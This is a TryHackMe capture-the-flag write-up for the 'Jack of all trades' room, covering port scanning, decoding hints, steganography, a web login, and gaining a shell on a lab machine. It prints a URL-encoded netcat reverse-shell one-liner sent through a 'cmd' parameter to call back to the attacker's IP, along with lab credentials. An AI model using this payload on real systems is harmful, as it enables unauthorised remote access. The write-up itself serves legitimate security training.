
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Jack_of_all_trades/images/83-1.png)

This room is also in the category of ctf, but i put it here as i learned a few tricks with curl.

As always, i started with a ports scanning.

```text
nmap -sS -T4 -p- 10.10.153.116
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-07 04:28 EDT
Nmap scan report for 10.10.153.116
Host is up (0.057s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```text

nmap -sV -sC -p22,80 10.10.153.116
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-07 04:30 EDT
Nmap scan report for 10.10.153.116
Host is up (0.056s latency).

PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Jack-of-all-trades!
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Taking a look at the mpre detailed i noticed the services are swaped. Usually the http service listens on port 80, and ssh on 22. I tried accessing the page usig my browser, but i cannot do that, so i used curl to retrieve and send requests.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Jack_of_all_trades/images/83-2.png)

From the response above, i noticed the stego.jpg image, /recovery.php page which can be used to login, and d base64 encoded string.

The base64 string decodes to:
```text 
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```
The password may be used in the steganography process. I downloaded the stego.jpg image and extracted the message.  

![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Jack_of_all_trades/images/83-3.png)

The message wasn't very useful.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Jack_of_all_trades/images/83-4.png)

```text
Hehe. Gotcha!

You're on the right path, but wrong image!
```
Let's see what other images are available. The only candidates are header.pg and jackinthebox.jpg.

![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Jack_of_all_trades/images/83-5.png)

I had anough images to chose from and i started with header.jpg.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Jack_of_all_trades/images/83-6.png)

It seems this was the one .  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Jack_of_all_trades/images/83-7.png)


The file contains:
```text
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY
```
I tried login via ssh, but no luck. What remained was to access the recovery.php page.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Jack_of_all_trades/images/83-8.png)

From base32, hex, rot13 decodes to:
```text
 Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
```
The hint points to the wikipedia page of the Stegosauria. The only login form is in the recovery.php and this one i used to gain a reverse shell.

```text
curl -c cookiejar -g -O -J -iL -F "user=jackinthebox" -F "pass=TplFxiSHjY"  http://10.10.153.116:22/recovery.php

HTTP/1.1 302 Found
Date: Mon, 07 Sep 2020 09:25:25 GMT
Server: Apache/2.4.10 (Debian)
Set-Cookie: PHPSESSID=pumre8sr4no1gets9nugd79hr2; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Set-Cookie: login=jackinthebox%3Aa78e6e9d6f7b9d0abe0ea866792b7d84; expires=Wed, 09-Sep-2020 09:25:25 GMT; Max-Age=172800
location: /nnxhweOV/index.php
Content-Length: 0
Content-Type: text/html; charset=UTF-8

HTTP/1.1 200 OK
Date: Mon, 07 Sep 2020 09:25:25 GMT
Server: Apache/2.4.10 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 52
Content-Type: text/html; charset=UTF-8

GET me a 'cmd' and I'll run it for you Future-Jack.
```
From the response, i am logged in and need to give a command. 
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Jack_of_all_trades/images/83-9.png)

Based on the response, ineeded to url encode some commands.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Jack_of_all_trades/images/83-10.png)

```text
curl -c cookiejar -F "user=jackinthebox" -F "pass=TplFxiSHjY" http://10.10.153.116:22/recovery.php -L http://10.10.153.116:22/nnxhweOV/index.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E8%2E5%2E181%201234%20%3E%2Ftmp%2Ff
```
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Jack_of_all_trades/images/83-11.png)


The file jaks_password_list contains obviously a list of passwords.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Jack_of_all_trades/images/83-12.png)

I used this list hoping among them was the real one.With the found password i logged into the ssh service.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Jack_of_all_trades/images/83-13.png)

With the found password i logged into the ssh service.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Jack_of_all_trades/images/83-14.png)

I hoped to see the user.txt flag, but i only found this image. I downloaded it to my computer using scp. After taking a closer look at the image, i found the flag.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Jack_of_all_trades/images/83-15.png)

This user can't run sudo, but there may be binaries with suid bit set that can be used to escalate privileges. The command strings can be used to find strings/words in files.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Jack_of_all_trades/images/83-16.png)
